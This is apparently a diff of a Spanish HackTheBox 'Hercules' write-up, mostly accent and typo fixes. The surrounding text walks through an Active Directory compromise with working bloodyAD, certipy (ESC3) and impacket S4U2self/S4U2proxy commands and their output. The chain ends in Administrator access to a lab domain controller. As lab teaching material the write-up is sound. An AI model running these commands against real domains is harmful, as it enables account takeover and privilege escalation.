 * Tenemos **CREATE_CHILD** en **OUs** importantes (**Engineering, Security, Web**),es decir, podemos crear objetos dentro de esas **OUs**: usuarios y computers incluidos.
 * Tenemos **WRITE** sobre muchos atributos `userCertificate, userCert, msPKI*, msDS-AllowedToActOnBehalfOfOtherIdentity` (y similares) en usuarios concretos (ej. **CN=Bob Wood**), es deicr, podemos escribir/inyectar certificados o **tokens PKI** en el objeto de usuario.
 * Tenemos **WRITE** sobre `name / cn` de muchos usuarios (**Stephen Miller, Auditor**, etc.), es decir, podemos renombrar/ajustar atributos identificadores o manipular el `cn/name`.
@@ -1652,7 +1727,7 @@ Recuerda que nuestro objetivo principal es llegar al **usuario auditor**, pero d
 
 Para este usuario, que pertenece al grupo **Security Helpdesk**, podemos moverlo al **OU Web Department** para que herede **ACLs** más permisivas de este **OU**.
 
-Esto con el fin de que podamos obtener un certificado y **TGT** de el, para después abusar de sus **ACLs**, con tal de que podamos llegar al **usuario auditor** y nos podamos autenticar como este.
+Esto con el fin de que podamos obtener un certificado y **TGT** de él, para después abusar de sus **ACLs**, con tal de que podamos llegar al **usuario auditor** y nos podamos autenticar como este.
 
 <br>
 
@@ -1704,7 +1779,7 @@ Ahora podemos mover a **stephen.m** al **OU Web Department**:
 [2025-10-25 00:37:24] [Set-DomainObjectDN] Modifying CN=STEPHEN MILLER,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb object dn to OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
 [2025-10-25 00:37:24] [Set-DomainObject] Success! modified new dn for CN=STEPHEN MILLER,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
 ```
-Funciono, esto hara que este usuario herede todos los **ACLs** de ese **OU**.
+Funcionó, esto hará que este usuario herede todos los **ACLs** de ese **OU**.
 
 Intentemos crear un certificado y **TGT** de **stephen.m**, pero necesitaremos nuevamente al **usuario natalie.a**.
 
@@ -1845,7 +1920,7 @@ HERCULES\Forest Management                 Group            S-1-5-21-1889966460-
 Authentication authority asserted identity Well-known group S-1-18-1                                      Mandatory group, Enabled by default, Enabled group
 Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 ```
-Observa que esta dentro del grupo **Forest Management**.
+Observa que está dentro del grupo **Forest Management**.
 
 | **Forest Management** |
 |:---------------------:|
@@ -1902,14 +1977,14 @@ Te explico el comando:
 
 <br>
 
-Del resultado, vemos que tenemos el permiso **GenericAll** sobre el **OU Forest Migration**, lo cual es bastante critico.
+Del resultado, vemos que tenemos el permiso **GenericAll** sobre el **OU Forest Migration**, lo cual es bastante crítico.
 
-Pues si asignamos ese permiso a nuestro usuario, tendremos control total sobre este **OU**, permitiendonos:
+Pues si asignamos ese permiso a nuestro usuario, tendremos control total sobre este **OU**, permitiéndonos:
 * Manipular los objetos (usuarios) existentes en el **OU**. 
 * Crear nuevos objetos.
 * Capacidad para restablecer las contraseñas de usuario existentes y más.
 
-Podemos poner al **usuario auditor** como el duñeño del **OU Forest Migration** con **bloodyAD**:
+Podemos poner al **usuario auditor** como el dueño del **OU Forest Migration** con **bloodyAD**:
 ```bash
 KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u Auditor -p 'Prettyprincess123!' -k set owner 'OU=FOREST MIGRATION,OU=DCHERCULES,DC=HERCULES,DC=HTB' Auditor
 [!] S-1-5-21-1889966460-2597381952-958560702-1128 is already the owner, no modification will be made
@@ -1927,7 +2002,7 @@ Listo, con esto ya tenemos control total de este **OU**.
 
 <h2 id="Fernando">Rehabilitando Cuenta Deshabilitada de Usuario Fernando.R</h2>
 
-Podemos investigar que usuarios regulares existen en este **OU**:
+Podemos investigar qué usuarios regulares existen en este **OU**:
 ```batch
 PS C:\Users\auditor\Desktop> Get-ADUser -SearchBase "OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb" -Filter * -Properties adminCount,UserAccountControl |
   Where-Object { ($_.adminCount -ne 1) -or ($_.adminCount -eq $null) } |
@@ -1979,7 +2054,7 @@ Para habilitarlo, usaremos **bloodyAD**:
 KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d 'hercules.htb' -u 'auditor' -k remove uac 'fernando.r' -f ACCOUNTDISABLE
 [-] ['ACCOUNTDISABLE'] property flags removed from fernando.r's userAccountControl
 ```
-Ya esta habilitado.
+Ya está habilitado.
 
 Lo podemos comprobar revisando su descripción de nuevo:
 ```batch
@@ -2022,7 +2097,7 @@ Antes que nada, debemos saber algunos conceptos:
 
 <br>
 
-Ahora sí, ¿De que va este ataque?
+Ahora sí, ¿De qué va este ataque?
 
 | **ESC3 Certificate Attack** |
 |:---------------------------:|
@@ -2207,9 +2282,11 @@ En resumen:
 	* **ESC15 Enrollee supplies subject and schema version is 1** (**Certipy** advierte que **ESC15** solo aplica si el entorno no ha sido parcheado, aplicable el **CVE-2024-49019**.
 	* **User Enrollable Principals** incluye **Smartcard Operators**: usuarios en ese grupo pueden solicitar/autoenrolar esta plantilla.
 
+<br>
+
 En general, la vulnerabilidad que vemos es **ESC3 Certificate Attack**.
 
-La idea es abuscar el usuario **fernando.r** para suplantarlo y crear certificados válidos que nos permitan convertirnos en otro usuario, siendo el **usuario ashley.b** nuestro siguiente objetivo.
+La idea es abusar del **usuario fernando.r** para suplantarlo y crear certificados válidos que nos permitan convertirnos en otro usuario, siendo el **usuario ashley.b** nuestro siguiente objetivo.
 
 Esto porque dicho usuario puede conectarse también vía **WinRM**, por lo que igual debe tener ciertos privilegios.
 
@@ -2236,7 +2313,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 ```
 Con este certificado, estamos suplantando al **usuario fernando.r**.
 
-Ahora como este usuario, crearemos un nuevo certificado para suplantar al **usuario ashley.b**:
+Ahora, como este usuario, crearemos un nuevo certificado para suplantar al **usuario ashley.b**:
 ```bash
 KRB5CCNAME=fernando.r.ccache certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca "CA-HERCULES" -template "User" -pfx fernando.r.pfx -on-behalf-of "HERCULES\\ashley.b" -dcom
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
@@ -2291,7 +2368,7 @@ hercules\ashley.b
 Estamos dentro.
 
 Si nos movemos un poco, encontraremos un script de **PowerShell**:
-```bash
+```batch
 PS C:\Users\ashley.b\Documents> cd ../Desktop
 PS C:\Users\ashley.b\Desktop> dir
 
@@ -2305,13 +2382,13 @@ d-----         12/4/2024  11:45 AM                Mail
 -a----         12/4/2024  11:45 AM            102 aCleanup.ps1
 ```
 
-Este script parece que esta hecho para resetear contraseñas, por lo que nos puede ser útil para más adelante:
-```bash
+Este script parece que está hecho para resetear contraseñas, por lo que nos puede ser útil para más adelante:
+```batch
 PS C:\Users\ashley.b\Desktop> type aCleanup.ps1
 Start-ScheduledTask -TaskName "Password Cleanup"
 ```
 
-Llegados a este punto, ¿Por que suplantamos al **usuario ashley.b**?
+Llegados a este punto, ¿Por qué suplantamos al **usuario ashley.b**?
 
 Resulta que este usuario pertenece al grupo **IT Support**:
 
@@ -2325,7 +2402,7 @@ Si revisamos la descripción de este grupo, vemos que se menciona como **Passwor
 <img src="/assets/images/htb-writeup-hercules/Captura42.png">
 </p>
 
-Normalmente, esta clase de descripciones estan relacionadas con la administración de contraseñas dentro del dominio.
+Normalmente, esta clase de descripciones están relacionadas con la administración de contraseñas dentro del dominio.
 
 Entonces, es buena idea que podamos asignarle más permisos a este grupo, pues nos puede servir para más adelante.
 
@@ -2344,15 +2421,15 @@ Esto último es para tener el control administrativo de todo el **OU**.
 
 <br>
 
-<h2 id="IIS_Support">Rehabilitando Usuario IIS_Administrator para Modificar Contraseña de Usuario IIS_webserver</h2>
+<h2 id="IIS_Support">Rehabilitando Usuario IIS_Administrator para Modificar Contraseña de Usuario IIS_webserver$</h2>
 
-Investigando un poco más con **BloodHound**, encontramos el grupo **Service Operators**, que no pudimos identificar sus usuarios:
+Investigando un poco más con **BloodHound**, encontramos el grupo **Service Operators**, que no pudimos identificar a sus usuarios:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura43.png">
 </p>
 
-Ya que tenemos una sesión activa, tanto como **auditor** como con **ashley.b**, podemos investigar que usuarios pertenecen a este grupo:
+Ya que tenemos una sesión activa, tanto como **auditor** como con **ashley.b**, podemos investigar qué usuarios pertenecen a este grupo:
 ```batch
 PS C:\Users\auditor\Documents> Get-ADGroupMember -Identity "Service Operators" -Recursive | Where {$_.objectClass -eq 'user'} | Select Name, SamAccountName, DistinguishedName
 
@@ -2362,7 +2439,7 @@ IIS_Administrator iis_administrator CN=IIS_Administrator,OU=Forest Migration,OU=
 ```
 Tenemos a un usuario llamado **iis_administrator**.
 
-Pero resulta que esta deshabilitado:
+Pero resulta que está deshabilitado:
 ```batch
 PS C:\Users\auditor\Documents> Get-ADUser -Identity "IIS_administrator"
 
@@ -2378,13 +2455,13 @@ Surname           :
 UserPrincipalName : iis_administrator@hercules.htb
 ```
 
-Este usuario se ha vuelto ahora nuestra prioridad, pues si revisamos que es lo que puede hacer el grupo **Service Operators**, es que puede cambiar la contraseña del **usuario IIS_weberver**:
+Este usuario se ha vuelto ahora nuestra prioridad, pues si revisamos qué es lo que puede hacer el grupo **Service Operators**, es que puede cambiar la contraseña del **usuario IIS_weberver$**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura44.png">
 </p>
 
-Resulta que el **usuario IIS_weberver**, tiene un permiso especial y peligroso si logramos suplantarlo:
+Resulta que el **usuario IIS_weberver$**, tiene un permiso especial y peligroso si logramos suplantarlo:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura45.png">
@@ -2394,7 +2471,7 @@ Resulta que el **usuario IIS_weberver**, tiene un permiso especial y peligroso s
 <img src="/assets/images/htb-writeup-hercules/Captura46.png">
 </p>
 
-En resumen, podemos aplicar el ataque **S4U2self/S4U2proxy Abuse Chain**, si es que logramos suplantar al **usuario IIS_webserver**.
+En resumen, podemos aplicar el ataque **S4U2self/S4U2proxy Abuse Chain**, si es que logramos suplantar al **usuario IIS_webserver$**.
 
 Este ataque lo explicaremos más adelante.
 
@@ -2403,9 +2480,9 @@ Primero, habilitemos al **usuario IIS_administrator**:
 KRB5CCNAME=Auditor.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'Auditor' -k remove uac "IIS_Administrator" -f ACCOUNTDISABLE
 [-] ['ACCOUNTDISABLE'] property flags removed from IIS_Administrator's userAccountControl
 ```
-Ya esta habilitado, puedes comprobarlo.
+Ya está habilitado, puedes comprobarlo.
 
-Podemos cambiarle la contraseña usando nuestro **usuario auditor**, pero para esto ejecutaremos el script **aCleanup.ps1**, pues nos permitira resetear cualquier contraseña sin conflictos.
+Podemos cambiarle la contraseña usando nuestro **usuario auditor**, pero para esto ejecutaremos el script **aCleanup.ps1**, pues nos permitirá resetear cualquier contraseña sin conflictos.
 
 Aunque puede que elimine los permisos **GenercAll** del grupo **IT Support** y del **usuario auditor**, por lo que después de ejecutarlo, puedes volver a asignarle esos permisos solo para estar seguros de que no se hayan eliminado:
 ```batch
@@ -2426,7 +2503,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in iis_administrator.ccache
 ```
 
-Ya con el **TGT**, podemos cambiarle la contraseña al **usuario IIS_webserver** usando **bloodyAD**:
+Ya con el **TGT**, podemos cambiarle la contraseña al **usuario IIS_webserver$** usando **bloodyAD**:
 ```bash
 KRB5CCNAME=iis_administrator.ccache bloodyAD --host DC.hercules.htb -d hercules.htb -u 'IIS_Administrator' -k set password "iis_webserver$" Passw0rd@123
 [+] Password changed successfully!
@@ -2438,7 +2515,7 @@ iconv -f ASCII -t UTF-16LE <(printf 'Passw0rd@123') | openssl dgst -md4
 MD4(stdin)= 14d0fcda7ad363097760391f302da68d
 ```
 
-Y usamos ese **Hash NT** para crear un **TGT** valido del **usuario IIS_webserver** con tal de suplantarlo:
+Y usamos ese **Hash NT** para crear un **TGT** válido del **usuario IIS_webserver$** con tal de suplantarlo:
 ```bash
 impacket-getTGT -hashes :14d0fcda7ad363097760391f302da68d 'hercules.htb/IIS_webserver$' -dc-ip 10.10.11.91
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -2458,7 +2535,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 <br>
 
-Te dejo aquí unos blogs que explican este ataque y muestran ejemplos practicos:
+Te dejo aquí unos blogs que explican este ataque y muestran ejemplos prácticos:
 * <a href="https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse" target="_blank">S4U2self abuse</a>
 * <a href="https://www.blackhillsinfosec.com/abusing-s4u2self-for-active-directory-pivoting/" target="_blank">Abusing S4U2Self for Active Directory Pivoting</a>
 * <a href="https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c" target="_blank">S4U2Pwnage</a>
@@ -2482,7 +2559,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 Funcionó.
 
-Ahora, para aplicar el ataque utilizaremos la herramienta **impacket-getST** y le indicamos que queremos suplantar al **usuario Administrator**:
+Ahora, para aplicar el ataque, utilizaremos la herramienta **impacket-getST** y le indicamos que queremos suplantar al **usuario Administrator**:
 ```bash
 KRB5CCNAME=IIS_webserver$.ccache impacket-getST -u2u -impersonate "Administrator" -spn "cifs/dc.hercules.htb" -k -no-pass 'hercules.htb'/'IIS_webserver$'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -2492,7 +2569,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Requesting S4U2Proxy
 [*] Saving ticket in Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache
 ```
-Excelente, nos genero un **archivo ccache**, siendo un **TGS**.
+Excelente, nos generó un **archivo ccache**, siendo un **TGS**.
 
 Utilicemos este **TGS** para autenticarnos en el **AD** como el **usuario Administrator**:
 ```batch
@@ -2501,7 +2578,7 @@ KRB5CCNAME=Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache python3 winrme
 PS C:\Users\Administrator\Documents> whoami
 hercules\administrator
 ```
-Estamos dentro y tenemos maximos privilegios.
+Estamos dentro y tenemos máximos privilegios.
 
 Busquemos la última flag:
 ```batch
@@ -2527,7 +2604,7 @@ Y con esto terminamos la máquina.
 <br>
 <div style="position: relative;">
   <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-</d1iv>
+</div>
 
 
 * https://github.com/ropnop/kerbrute
